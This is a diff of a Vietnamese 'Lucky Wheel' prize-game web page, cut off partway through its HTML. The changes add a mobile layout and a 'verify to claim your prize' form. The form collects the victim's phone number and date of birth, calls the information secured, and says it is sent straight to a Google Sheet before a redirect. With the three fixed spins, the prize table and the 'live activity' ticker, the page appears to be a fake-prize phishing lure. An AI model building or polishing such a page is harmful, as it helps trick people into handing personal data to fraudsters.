@@ -2,582 +2,516 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Vòng Quay May Mắn</title>
+<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;600;700&family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: Arial, sans-serif; overflow-x: hidden; background: #1a0000; }
-  #game-container {
-    min-height: 100vh;
-    background: linear-gradient(135deg, #ff4e50 0%, #f9a825 50%, #ff6b6b 100%);
-    display: flex; flex-direction: column;
-    align-items: center; padding: 20px;
-    position: relative; overflow: hidden;
-  }
-  .title-box {
-    background: linear-gradient(135deg, #8B0000, #C0392B);
-    border: 3px solid #FFD700; border-radius: 12px;
-    padding: 10px 40px; margin-bottom: 12px;
-    text-align: center;
-    box-shadow: 0 4px 30px rgba(255,215,0,0.4), 0 0 60px rgba(255,50,50,0.3);
-  }
-  .title-box h1 { color: #FFD700; font-size: 26px; font-weight: 900; letter-spacing: 2px; text-shadow: 0 0 20px #FFD700, 2px 2px 4px rgba(0,0,0,0.5); }
-  .subtitle { color: #fff; font-size: 12px; margin-top: 4px; }
-  .top-row { display: flex; align-items: center; gap: 20px; margin-top: 10px; flex-wrap: wrap; justify-content: center; }
-
-  /* Chances box */
-  .chances-box {
-    background: #fff; border-radius: 50%;
-    width: 110px; height: 110px;
-    display: flex; flex-direction: column;
-    align-items: center; justify-content: center;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.2), 0 0 20px rgba(255,215,0,0.5);
-    border: 4px solid #FFD700;
-  }
-  .chances-box .lbl { font-size: 10px; color: #999; text-align: center; }
-  .chances-box .num { font-size: 42px; font-weight: 900; color: #C0392B; line-height: 1; }
-  .chances-box .lbl2 { font-size: 11px; color: #555; }
-
-  /* My prize box */
-  .myprizebox {
-    background: linear-gradient(135deg, #7B1FA2, #4A148C);
-    border: 3px solid #FFD700; border-radius: 14px;
-    padding: 12px 20px; text-align: center; min-width: 160px;
-    box-shadow: 0 4px 20px rgba(123,31,162,0.5), 0 0 30px rgba(255,215,0,0.3);
-  }
-  .myprizebox .mlbl { color: #CE93D8; font-size: 11px; margin-bottom: 4px; }
-  .myprizebox .mval { color: #FFD700; font-size: 20px; font-weight: 900; text-shadow: 0 0 10px #FFD700; }
-  .myprizebox .mlist { margin-top: 6px; }
-  .myprizebox .mlist-item { color: #fff; font-size: 11px; padding: 1px 0; }
-  .myprizebox .mlist-item:empty { display: none; }
-  .myprizebox .mtotal-lbl { color: #CE93D8; font-size: 10px; margin-top: 6px; border-top: 1px solid rgba(255,215,0,0.3); padding-top: 4px; }
-
-  /* Wheel */
-  .wheel-wrapper { position: relative; width: 380px; height: 380px; }
-  .pointer {
-    position: absolute; top: -22px; left: 50%;
-    transform: translateX(-50%); z-index: 10;
-    width: 0; height: 0;
-    border-left: 18px solid transparent;
-    border-right: 18px solid transparent;
-    border-top: 40px solid #FFD700;
-    filter: drop-shadow(0 0 8px #FFD700) drop-shadow(0 2px 6px rgba(0,0,0,0.4));
-    animation: pointerGlow 1.5s ease-in-out infinite;
-  }
-  @keyframes pointerGlow {
-    0%,100% { filter: drop-shadow(0 0 6px #FFD700); }
-    50% { filter: drop-shadow(0 0 18px #FFD700) drop-shadow(0 0 30px #FFA500); }
-  }
-  canvas#wheel {
-    border-radius: 50%;
-    box-shadow: 0 0 0 10px #C0392B, 0 0 0 18px #FFD700, 0 0 0 24px #C0392B,
-                0 0 40px rgba(255,215,0,0.6), 0 0 80px rgba(255,50,50,0.4);
-    animation: wheelGlow 2s ease-in-out infinite;
-  }
-  @keyframes wheelGlow {
-    0%,100% { box-shadow: 0 0 0 10px #C0392B, 0 0 0 18px #FFD700, 0 0 0 24px #C0392B, 0 0 40px rgba(255,215,0,0.4), 0 0 80px rgba(255,50,50,0.3); }
-    50%      { box-shadow: 0 0 0 10px #C0392B, 0 0 0 18px #FFD700, 0 0 0 24px #C0392B, 0 0 60px rgba(255,215,0,0.8), 0 0 100px rgba(255,100,50,0.6); }
-  }
-  .spin-btn {
-    position: absolute; top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    width: 90px; height: 90px; border-radius: 50%;
-    background: linear-gradient(135deg, #FFD700, #FFA500);
-    border: 4px solid #fff; color: #8B0000;
-    font-size: 14px; font-weight: 900; cursor: pointer;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.3), inset 0 2px 4px rgba(255,255,255,0.5), 0 0 20px rgba(255,215,0,0.8);
-    transition: all 0.15s;
-    animation: btnPulse 1.5s ease-in-out infinite;
-  }
-  @keyframes btnPulse {
-    0%,100% { box-shadow: 0 4px 20px rgba(0,0,0,0.3), 0 0 20px rgba(255,215,0,0.6); }
-    50%      { box-shadow: 0 4px 20px rgba(0,0,0,0.3), 0 0 40px rgba(255,215,0,1), 0 0 60px rgba(255,165,0,0.6); }
-  }
-  .spin-btn:hover:not(:disabled) { transform: translate(-50%,-50%) scale(1.1); animation: none; box-shadow: 0 6px 30px rgba(255,215,0,1); }
-  .spin-btn:active:not(:disabled) { transform: translate(-50%,-50%) scale(0.95); }
-  .spin-btn:disabled { opacity: 0.6; cursor: not-allowed; animation: none; }
-
-  /* Lights ring */
-  .lights-ring {
-    position: absolute; top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    width: 400px; height: 400px;
-    border-radius: 50%; pointer-events: none; z-index: -1;
-  }
-  .light-dot {
-    position: absolute; width: 12px; height: 12px;
-    border-radius: 50%; top: 50%; left: 50%;
-  }
-
-  /* Result popup */
-  .result-popup {
-    display: none; position: fixed; inset: 0;
-    background: rgba(0,0,0,0.7); z-index: 200;
-    align-items: center; justify-content: center;
-  }
-  .result-popup.show { display: flex; }
-  .result-card {
-    background: linear-gradient(135deg, #8B0000, #C0392B);
-    border: 4px solid #FFD700; border-radius: 20px;
-    padding: 36px 48px; text-align: center;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.6), 0 0 40px rgba(255,215,0,0.4);
-    animation: popIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
-    position: relative; overflow: hidden;
-  }
-  @keyframes popIn { from{transform:scale(0.3) rotate(-10deg);opacity:0;}to{transform:scale(1) rotate(0);opacity:1;} }
-  .result-card .congrats { color: #FFD700; font-size: 13px; letter-spacing: 2px; margin-bottom: 6px; }
-  .result-card .prize-icon { font-size: 64px; margin-bottom: 8px; animation: iconBounce 0.6s ease; }
-  @keyframes iconBounce { 0%{transform:scale(0);}60%{transform:scale(1.3);}100%{transform:scale(1);} }
-  .result-card .prize-name { color: #fff; font-size: 22px; font-weight: 900; margin-bottom: 8px; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
-  .result-card .spin-left { color: #FFD700; font-size: 13px; margin-bottom: 20px; }
-  .close-btn {
-    background: linear-gradient(135deg, #FFD700, #FFA500);
-    border: none; border-radius: 30px; padding: 12px 36px;
-    color: #8B0000; font-size: 16px; font-weight: 900;
-    cursor: pointer; transition: all 0.15s;
-    box-shadow: 0 4px 15px rgba(255,215,0,0.4);
-  }
-  .close-btn:hover { transform: scale(1.05); box-shadow: 0 6px 25px rgba(255,215,0,0.7); }
-
-  /* Decorations */
-  .decorations { position: absolute; inset: 0; pointer-events: none; overflow: hidden; }
-  .coin {
-    position: absolute; width: 40px; height: 40px;
-    background: radial-gradient(circle at 35% 35%, #FFE066, #FFA500);
-    border-radius: 50%; border: 3px solid #CC8800;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 18px; font-weight: 900; color: #8B4513;
-    animation: floatCoin 3s ease-in-out infinite;
-    box-shadow: 0 0 10px rgba(255,215,0,0.5);
-  }
-  @keyframes floatCoin{0%,100%{transform:translateY(0) rotate(0deg);}50%{transform:translateY(-18px) rotate(15deg);}}
-  .sparkle { position: absolute; font-size: 22px; animation: twinkle 2s ease-in-out infinite; }
-  @keyframes twinkle{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.2;transform:scale(0.6);}}
-
-  .no-spin-msg {
-    color: #FFD700; font-size: 14px; font-weight: bold;
-    text-align: center; background: rgba(139,0,0,0.7);
-    border-radius: 8px; padding: 10px 20px; margin-top: 12px; display: none;
-    border: 1px solid #FFD700; box-shadow: 0 0 20px rgba(255,215,0,0.3);
-  }
-
-  /* Prize table */
-  .prize-list {
-    background: rgba(100,0,0,0.6);
-    border: 2px solid #FFD700; border-radius: 14px;
-    padding: 16px 20px; margin-top: 22px;
-    width: 100%; max-width: 540px;
-    backdrop-filter: blur(4px);
-    box-shadow: 0 4px 20px rgba(0,0,0,0.3), 0 0 30px rgba(255,215,0,0.1);
-  }
-  .prize-list h3 { color: #FFD700; font-size: 15px; text-align: center; margin-bottom: 12px; letter-spacing: 1px; text-shadow: 0 0 10px #FFD700; }
-  .prize-table { width: 100%; border-collapse: collapse; }
-  .prize-table tr:nth-child(even) td { background: rgba(255,255,255,0.06); }
-  .prize-table td { color: #fff; padding: 7px 10px; font-size: 13px; vertical-align: middle; }
-  .prize-table td:last-child { text-align: right; }
-  .count-badge {
-    display: inline-block;
-    background: rgba(255,215,0,0.15);
-    border: 1px solid rgba(255,215,0,0.4);
-    border-radius: 20px; padding: 2px 12px;
-    color: #FFD700; font-weight: 700; font-size: 12px;
-    min-width: 80px; text-align: center; transition: all 0.35s;
-  }
-  .count-badge.bump { background: rgba(255,215,0,0.45); transform: scale(1.18); box-shadow: 0 0 12px rgba(255,215,0,0.6); }
-  .live-ticker {
-    margin-top: 12px; background: rgba(0,0,0,0.35);
-    border-radius: 8px; padding: 8px 14px;
-    font-size: 12px; color: #ffe; text-align: center;
-    border: 1px solid rgba(255,215,0,0.25);
-    box-shadow: inset 0 0 10px rgba(255,215,0,0.05);
-  }
-  .live-ticker span { color: #FFD700; font-weight: bold; }
-
-  /* Confetti */
-  .confetti-piece {
-    position: fixed; width: 10px; height: 10px;
-    border-radius: 2px; opacity: 0;
-    pointer-events: none; z-index: 300;
-    animation: confettiFall 1.2s ease-in forwards;
-  }
-  @keyframes confettiFall {
-    0%   { opacity: 1; transform: translateY(0) rotate(0deg); }
-    100% { opacity: 0; transform: translateY(300px) rotate(720deg); }
-  }
+:root {
+  --red:#D81B1B;--red2:#FF2D2D;--gold:#FFD700;--gold2:#FFA500;
+  --purple:#6A1B9A;--dark:#1a0000;--white:#fff;--r:14px;
+}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+html,body{height:100%;overflow-x:hidden;}
+body{font-family:'Be Vietnam Pro',Arial,sans-serif;background:var(--dark);min-height:100vh;}
+#app{
+  min-height:100vh;
+  background:radial-gradient(ellipse at 20% 0%,rgba(255,80,0,.35) 0%,transparent 60%),
+             radial-gradient(ellipse at 80% 100%,rgba(255,50,0,.25) 0%,transparent 60%),
+             linear-gradient(160deg,#c0392b 0%,#e74c3c 30%,#f39c12 65%,#e67e22 100%);
+  display:flex;flex-direction:column;align-items:center;padding:0 0 40px;
+  position:relative;overflow:hidden;
+}
+.particle{position:absolute;border-radius:50%;pointer-events:none;animation:floatUp linear infinite;}
+@keyframes floatUp{0%{transform:translateY(0) scale(1);opacity:.7;}100%{transform:translateY(-100vh) scale(.3);opacity:0;}}
+.header{width:100%;padding:14px 16px 10px;background:linear-gradient(180deg,rgba(0,0,0,.4) 0%,transparent 100%);text-align:center;position:relative;z-index:2;}
+.header-title{font-family:'Oswald',sans-serif;font-size:clamp(20px,6vw,28px);font-weight:700;color:var(--gold);text-shadow:0 0 20px rgba(255,215,0,.8);letter-spacing:1.5px;animation:titleGlow 2s ease-in-out infinite;}
+@keyframes titleGlow{0%,100%{text-shadow:0 0 15px rgba(255,215,0,.6);}50%{text-shadow:0 0 30px rgba(255,215,0,1),0 0 60px rgba(255,165,0,.5);}}
+.header-sub{font-size:11px;color:rgba(255,255,255,.8);margin-top:3px;}
+.info-row{display:flex;gap:10px;width:100%;padding:0 14px;margin-bottom:12px;z-index:2;}
+.info-card{flex:1;border-radius:var(--r);padding:10px 12px;text-align:center;backdrop-filter:blur(10px);}
+.info-card.chances{background:rgba(255,255,255,.15);border:1.5px solid rgba(255,215,0,.5);box-shadow:0 4px 16px rgba(0,0,0,.2);}
+.info-card.myprizebox{background:rgba(106,27,154,.5);border:1.5px solid rgba(255,215,0,.4);box-shadow:0 4px 16px rgba(106,27,154,.3);text-align:left;}
+.ic-lbl{font-size:10px;color:rgba(255,255,255,.7);margin-bottom:2px;}
+.ic-num{font-family:'Oswald',sans-serif;font-size:36px;font-weight:700;color:var(--gold);line-height:1;text-shadow:0 0 15px var(--gold);}
+.ic-lbl2{font-size:10px;color:rgba(255,255,255,.8);}
+.ic-prizes{min-height:48px;}
+.ic-prize-item{font-size:11px;color:#fff;line-height:1.7;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.ic-total-lbl{font-size:9px;color:rgba(206,147,216,.9);border-top:1px solid rgba(255,215,0,.2);padding-top:4px;margin-top:4px;}
+.ic-total-val{font-size:14px;font-weight:700;color:var(--gold);text-shadow:0 0 8px var(--gold);}
+.wheel-section{position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;width:100%;padding:0 10px;}
+.wheel-outer{position:relative;width:min(340px,92vw);height:min(340px,92vw);}
+.pointer-wrap{position:absolute;top:-20px;left:50%;transform:translateX(-50%);z-index:10;}
+.pointer-svg{filter:drop-shadow(0 0 8px var(--gold));animation:pGlow 1.4s ease-in-out infinite;}
+@keyframes pGlow{0%,100%{filter:drop-shadow(0 0 6px var(--gold));}50%{filter:drop-shadow(0 0 20px var(--gold)) drop-shadow(0 0 40px var(--gold2));}}
+canvas#wheel{border-radius:50%;display:block;width:100%;height:100%;}
+.spin-btn-wrap{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:5;}
+.spin-btn{width:min(84px,22vw);height:min(84px,22vw);border-radius:50%;background:radial-gradient(circle at 35% 30%,#FFE566,#FF8C00);border:3.5px solid #fff;color:var(--red);font-family:'Oswald',sans-serif;font-size:clamp(11px,3vw,14px);font-weight:700;cursor:pointer;transition:transform .15s;animation:spinBtnPulse 1.6s ease-in-out infinite;-webkit-appearance:none;}
+@keyframes spinBtnPulse{0%,100%{box-shadow:0 4px 20px rgba(0,0,0,.3),0 0 15px rgba(255,215,0,.5);}50%{box-shadow:0 4px 20px rgba(0,0,0,.3),0 0 35px rgba(255,215,0,1);}}
+.spin-btn:active{transform:scale(.93);animation:none;}
+.spin-btn:disabled{opacity:.55;animation:none;cursor:not-allowed;}
+.glow-ring{position:absolute;inset:-16px;border-radius:50%;border:3px solid transparent;background:conic-gradient(from 0deg,#FFD700,#FF6B00,#FF0000,#FFD700) border-box;-webkit-mask:linear-gradient(#fff 0 0) padding-box,linear-gradient(#fff 0 0);-webkit-mask-composite:destination-out;mask-composite:exclude;animation:ringRotate 3s linear infinite;pointer-events:none;}
+@keyframes ringRotate{to{transform:rotate(360deg);}}
+.no-spin-msg{display:none;margin-top:10px;background:rgba(0,0,0,.45);border:1px solid var(--gold);border-radius:30px;padding:8px 20px;color:var(--gold);font-size:12px;font-weight:600;text-align:center;}
+.prize-section{width:100%;padding:0 14px;margin-top:16px;z-index:2;}
+.prize-box{background:rgba(0,0,0,.35);border:1.5px solid rgba(255,215,0,.35);border-radius:16px;overflow:hidden;backdrop-filter:blur(8px);}
+.prize-box-header{background:linear-gradient(135deg,rgba(139,0,0,.8),rgba(180,0,0,.6));padding:10px 16px;text-align:center;font-family:'Oswald',sans-serif;font-size:14px;color:var(--gold);letter-spacing:1px;border-bottom:1px solid rgba(255,215,0,.3);}
+.prize-row{display:flex;align-items:center;justify-content:space-between;padding:9px 14px;border-bottom:1px solid rgba(255,255,255,.06);transition:background .2s;}
+.prize-row:last-child{border-bottom:none;}
+.prize-row:nth-child(even){background:rgba(255,255,255,.04);}
+.prize-name-cell{font-size:13px;color:#fff;display:flex;align-items:center;gap:8px;}
+.prize-count{font-size:11px;font-weight:600;color:var(--gold);background:rgba(255,215,0,.12);border:1px solid rgba(255,215,0,.3);border-radius:20px;padding:2px 10px;transition:all .3s;white-space:nowrap;}
+.prize-count.bump{background:rgba(255,215,0,.4);transform:scale(1.15);}
+.live-ticker{padding:8px 14px;background:rgba(0,0,0,.3);font-size:11px;color:rgba(255,255,255,.8);text-align:center;border-top:1px solid rgba(255,215,0,.15);}
+.live-ticker b{color:var(--gold);}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:400;align-items:flex-end;justify-content:center;backdrop-filter:blur(6px);}
+.overlay.show{display:flex;}
+.sheet{width:100%;max-width:480px;border-radius:24px 24px 0 0;padding:20px 20px 36px;animation:slideUp .35s cubic-bezier(.34,1.4,.64,1);}
+@keyframes slideUp{from{transform:translateY(100%);opacity:0;}to{transform:translateY(0);opacity:1;}}
+#resultOverlay .sheet{background:linear-gradient(160deg,#7f0000,#c0392b);border:2px solid var(--gold);box-shadow:0 -10px 60px rgba(0,0,0,.5);text-align:center;}
+.sheet-handle{width:40px;height:4px;background:rgba(255,255,255,.3);border-radius:2px;margin:0 auto 16px;}
+.result-congrats{font-size:12px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;}
+.result-icon{font-size:60px;margin-bottom:6px;animation:bounceIn .5s ease;}
+@keyframes bounceIn{0%{transform:scale(0);}60%{transform:scale(1.25);}100%{transform:scale(1);}}
+.result-name{font-family:'Oswald',sans-serif;font-size:22px;color:#fff;margin-bottom:6px;}
+.result-left{font-size:12px;color:var(--gold);margin-bottom:18px;}
+.result-btn{width:100%;padding:15px;border:none;border-radius:30px;background:linear-gradient(135deg,var(--gold),var(--gold2));color:var(--red);font-family:'Oswald',sans-serif;font-size:17px;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(255,215,0,.4);transition:transform .15s;}
+.result-btn:active{transform:scale(.97);}
+#verifyOverlay{align-items:center;justify-content:center;padding:16px;}
+#verifyOverlay .sheet{border-radius:24px;background:linear-gradient(160deg,#130820,#221040);border:2px solid var(--gold);box-shadow:0 0 60px rgba(255,215,0,.25);max-height:90vh;overflow-y:auto;}
+.v-shield{font-size:44px;text-align:center;margin-bottom:6px;}
+.v-title{font-family:'Oswald',sans-serif;font-size:20px;color:var(--gold);text-align:center;margin-bottom:4px;text-shadow:0 0 15px var(--gold);}
+.v-sub{font-size:13px;color:rgba(206,147,216,.9);text-align:center;margin-bottom:14px;line-height:1.5;}
+.v-prizes-box{background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.3);border-radius:12px;padding:12px 14px;margin-bottom:14px;}
+.v-prizes-title{font-size:11px;color:rgba(255,215,0,.8);margin-bottom:8px;text-align:center;}
+.v-prize-row{font-size:13px;color:#fff;padding:3px 0;}
+.v-prize-total{font-size:14px;font-weight:700;color:var(--gold);text-align:center;margin-top:8px;border-top:1px solid rgba(255,215,0,.2);padding-top:8px;}
+.input-group{margin-bottom:12px;}
+.input-label{font-size:12px;color:rgba(255,255,255,.7);margin-bottom:6px;display:block;}
+.phone-input-wrap{display:flex;gap:8px;align-items:center;}
+.phone-flag{background:rgba(255,255,255,.1);border:1.5px solid rgba(255,215,0,.4);border-radius:10px;padding:0 12px;height:48px;color:#fff;font-size:14px;display:flex;align-items:center;gap:4px;white-space:nowrap;flex-shrink:0;}
+.phone-field{flex:1;height:48px;background:rgba(255,255,255,.1);border:1.5px solid rgba(255,215,0,.4);border-radius:10px;padding:0 14px;color:#fff;font-size:15px;font-family:'Be Vietnam Pro',sans-serif;outline:none;transition:border-color .2s;-webkit-appearance:none;}
+.phone-field::placeholder{color:rgba(255,255,255,.35);}
+.phone-field:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(255,215,0,.15);}
+.dob-row{display:flex;gap:8px;margin-bottom:12px;}
+.dob-row select{flex:1;height:48px;background:rgba(255,255,255,.1);border:1.5px solid rgba(255,215,0,.4);border-radius:10px;padding:0 10px;color:#fff;font-size:13px;font-family:'Be Vietnam Pro',sans-serif;outline:none;cursor:pointer;-webkit-appearance:none;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23FFD700' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 10px center;padding-right:28px;}
+.dob-row select option{background:#221040;color:#fff;}
+.dob-row select:focus{border-color:var(--gold);}
+.checkbox-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:14px;}
+.checkbox-row input[type=checkbox]{width:20px;height:20px;flex-shrink:0;margin-top:1px;accent-color:var(--gold);cursor:pointer;}
+.checkbox-row label{font-size:12px;color:rgba(255,255,255,.75);line-height:1.5;cursor:pointer;}
+.checkbox-row label span{color:var(--gold);}
+.v-error{color:#ff6b6b;font-size:12px;margin-bottom:10px;min-height:16px;text-align:center;}
+.v-confirm-btn{width:100%;padding:15px;border:none;border-radius:30px;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#130820;font-family:'Oswald',sans-serif;font-size:17px;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(255,215,0,.4);transition:transform .15s,opacity .2s;margin-bottom:8px;}
+.v-confirm-btn:active{transform:scale(.97);}
+/* Sending state */
+.v-confirm-btn.sending{opacity:.7;cursor:not-allowed;}
+.v-note{text-align:center;font-size:11px;color:rgba(255,255,255,.35);}
+#playedOverlay{align-items:center;justify-content:center;padding:20px;}
+#playedOverlay .sheet{border-radius:24px;text-align:center;background:linear-gradient(160deg,#1a0a00,#3d1a00);border:2px solid #FF6B35;box-shadow:0 0 60px rgba(255,107,53,.3);max-width:360px;}
+.p-icon{font-size:54px;margin-bottom:10px;}
+.p-title{font-family:'Oswald',sans-serif;font-size:20px;color:#FF6B35;margin-bottom:8px;}
+.p-msg{font-size:13px;color:rgba(255,255,255,.75);line-height:1.6;margin-bottom:16px;}
+.p-prize-box{background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.25);border-radius:12px;padding:12px;margin-bottom:16px;}
+.p-prize-lbl{font-size:11px;color:rgba(206,147,216,.8);margin-bottom:6px;}
+.p-prize-val{font-size:14px;font-weight:700;color:var(--gold);}
+.p-visit-btn{width:100%;padding:15px;border:none;border-radius:30px;background:linear-gradient(135deg,#FF6B35,#FF8C00);color:#fff;font-family:'Oswald',sans-serif;font-size:17px;font-weight:700;cursor:pointer;transition:transform .15s;}
+.p-visit-btn:active{transform:scale(.97);}
+.cf{position:fixed;border-radius:2px;opacity:0;pointer-events:none;z-index:999;animation:cfFall 1.3s ease-in forwards;}
+@keyframes cfFall{0%{opacity:1;transform:translateY(0) rotate(0);}100%{opacity:0;transform:translateY(320px) rotate(800deg);}}
+@supports (padding-bottom:env(safe-area-inset-bottom)){
+  #app{padding-bottom:calc(40px + env(safe-area-inset-bottom));}
+  .sheet{padding-bottom:calc(28px + env(safe-area-inset-bottom));}
+}
+/* Success state */
+.send-success{display:none;text-align:center;padding:10px;background:rgba(0,200,100,.15);border:1px solid rgba(0,200,100,.4);border-radius:10px;color:#4ade80;font-size:13px;margin-bottom:12px;}
+.send-success.show{display:block;}
 </style>
 </head>
 <body>
-<div id="game-container">
-  <div class="decorations">
-    <div class="coin" style="top:8%;left:5%;animation-delay:0s">¥</div>
-    <div class="coin" style="top:15%;right:6%;animation-delay:0.7s">¥</div>
-    <div class="coin" style="bottom:18%;left:4%;animation-delay:1.2s">¥</div>
-    <div class="coin" style="bottom:10%;right:5%;animation-delay:0.4s">¥</div>
-    <div class="sparkle" style="top:5%;left:22%">✦</div>
-    <div class="sparkle" style="top:10%;right:22%;animation-delay:0.5s">✦</div>
-    <div class="sparkle" style="bottom:22%;left:18%;animation-delay:1s">✧</div>
-    <div class="sparkle" style="bottom:28%;right:18%;animation-delay:1.5s">✦</div>
+<div id="app">
+  <div id="particles"></div>
+  <div class="header">
+    <div class="header-title">🎰 VÒNG QUAY MAY MẮN 🎰</div>
+    <div class="header-sub">Sự kiện: 31/03/2026 – 30/04/2026</div>
   </div>
-
-  <div class="title-box">
-    <h1>🎰 VÒNG QUAY MAY MẮN 🎰</h1>
-    <div class="subtitle">Thời gian sự kiện: 2026/03/31 – 2026/04/30</div>
-  </div>
-
-  <div class="top-row">
-    <!-- Chances -->
-    <div class="chances-box">
-      <span class="lbl">Bạn vẫn còn</span>
-      <span class="num" id="chances">3</span>
-      <span class="lbl2">Lần cơ hội</span>
+  <div class="info-row">
+    <div class="info-card chances">
+      <div class="ic-lbl">Lượt còn lại</div>
+      <div class="ic-num" id="chances">3</div>
+      <div class="ic-lbl2">lần quay</div>
     </div>
-
-    <!-- Wheel -->
-    <div class="wheel-wrapper">
-      <div class="pointer"></div>
-      <canvas id="wheel" width="360" height="360"></canvas>
-      <button class="spin-btn" id="spinBtn" onclick="spin()">Bắt đầu</button>
-    </div>
-
-    <!-- My Prizes -->
-    <div class="myprizebox">
-      <div class="mlbl">🎁 Giải thưởng của tôi</div>
-      <div class="mlist" id="myPrizeList">
-        <div class="mlist-item" id="r1">—</div>
-        <div class="mlist-item" id="r2">—</div>
-        <div class="mlist-item" id="r3">—</div>
+    <div class="info-card myprizebox">
+      <div class="ic-lbl">🎁 Giải của tôi</div>
+      <div class="ic-prizes">
+        <div class="ic-prize-item" id="r1">— Lượt 1</div>
+        <div class="ic-prize-item" id="r2">— Lượt 2</div>
+        <div class="ic-prize-item" id="r3">— Lượt 3</div>
       </div>
-      <div class="mtotal-lbl">Tổng nhận được</div>
-      <div class="mval" id="totalVal">0 ₫</div>
+      <div class="ic-total-lbl">Tổng nhận</div>
+      <div class="ic-total-val" id="totalVal">0 ₫</div>
     </div>
   </div>
-
-  <div class="no-spin-msg" id="noSpinMsg">🎊 Bạn đã dùng hết 3 lượt! Cảm ơn bạn đã tham gia!</div>
-
-  <div class="prize-list">
-    <h3>🏆 BẢNG GIẢI THƯỞNG</h3>
-    <table class="prize-table" id="prizeTable"></table>
-    <div class="live-ticker" id="liveTicker">🔴 Đang tải hoạt động...</div>
+  <div class="wheel-section">
+    <div class="wheel-outer" id="wheelOuter">
+      <div class="glow-ring"></div>
+      <div class="pointer-wrap">
+        <svg class="pointer-svg" width="32" height="44" viewBox="0 0 32 44">
+          <polygon points="16,2 30,42 16,34 2,42" fill="#FFD700" stroke="#fff" stroke-width="1.5"/>
+        </svg>
+      </div>
+      <canvas id="wheel"></canvas>
+      <div class="spin-btn-wrap">
+        <button class="spin-btn" id="spinBtn" onclick="spin()">BẮT<br>ĐẦU</button>
+      </div>
+    </div>
+    <div class="no-spin-msg" id="noSpinMsg">🎊 Đã hết lượt — Xác minh để nhận thưởng!</div>
+  </div>
+  <div class="prize-section">
+    <div class="prize-box">
+      <div class="prize-box-header">🏆 BẢNG GIẢI THƯỞNG</div>
+      <div id="prizeRows"></div>
+      <div class="live-ticker" id="liveTicker">🔴 Đang tải hoạt động...</div>
+    </div>
   </div>
 </div>
 
-<!-- Result popup -->
-<div class="result-popup" id="resultPopup">
-  <div class="result-card">
-    <div class="congrats">🎉 CHÚC MỪNG BẠN ĐÃ TRÚNG 🎉</div>
-    <div class="prize-icon" id="prizeIcon">🎁</div>
-    <div class="prize-name" id="prizeName">Giải thưởng</div>
-    <div class="spin-left" id="spinLeftMsg"></div>
-    <button class="close-btn" onclick="closeResult()">Nhận thưởng ✓</button>
+<!-- Result -->
+<div class="overlay" id="resultOverlay">
+  <div class="sheet">
+    <div class="sheet-handle"></div>
+    <div class="result-congrats">🎉 CHÚC MỪNG BẠN ĐÃ TRÚNG 🎉</div>
+    <div class="result-icon" id="rIcon">🎁</div>
+    <div class="result-name" id="rName">Giải thưởng</div>
+    <div class="result-left" id="rLeft"></div>
+    <button class="result-btn" onclick="closeResult()">Nhận thưởng ✓</button>
+  </div>
+</div>
+
+<!-- Verify -->
+<div class="overlay" id="verifyOverlay">
+  <div class="sheet">
+    <div class="v-shield">🔞</div>
+    <div class="v-title">Xác minh để nhận thưởng</div>
+    <div class="v-sub">Điền thông tin để nhận giải thưởng của bạn.</div>
+    <div class="v-prizes-box">
+      <div class="v-prizes-title">Giải thưởng của bạn</div>
+      <div id="vr1" class="v-prize-row"></div>
+      <div id="vr2" class="v-prize-row"></div>
+      <div id="vr3" class="v-prize-row"></div>
+      <div class="v-prize-total" id="vTotal">Tổng: 0 ₫</div>
+    </div>
+    <div class="input-group">
+      <label class="input-label">📱 Số điện thoại nhận thưởng</label>
+      <div class="phone-input-wrap">
+        <div class="phone-flag">🇻🇳 +84</div>
+        <input class="phone-field" id="phoneInput" type="tel" inputmode="numeric" placeholder="Nhập số điện thoại..." maxlength="10" pattern="[0-9]*">
+      </div>
+    </div>
+    <label class="input-label">🎂 Ngày sinh (phải đủ 18 tuổi)</label>
+    <div class="dob-row">
+      <select id="dobDay"><option value="">Ngày</option></select>
+      <select id="dobMonth"><option value="">Tháng</option></select>
+      <select id="dobYear"><option value="">Năm</option></select>
+    </div>
+    <div class="checkbox-row">
+      <input type="checkbox" id="agreeChk">
+      <label for="agreeChk">Tôi xác nhận đủ <span>18 tuổi</span> và đồng ý <span>Điều khoản</span> chương trình.</label>
+    </div>
+    <div class="v-error" id="vError"></div>
+    <div class="send-success" id="sendSuccess">✅ Đã gửi thông tin thành công! Đang chuyển hướng...</div>
+    <button class="v-confirm-btn" id="vConfirmBtn">✅ Xác nhận & Nhận thưởng</button>
+    <div class="v-note">🔒 Thông tin được bảo mật — Gửi trực tiếp về Google Sheet</div>
+  </div>
+</div>
+
+<!-- Already played -->
+<div class="overlay" id="playedOverlay">
+  <div class="sheet">
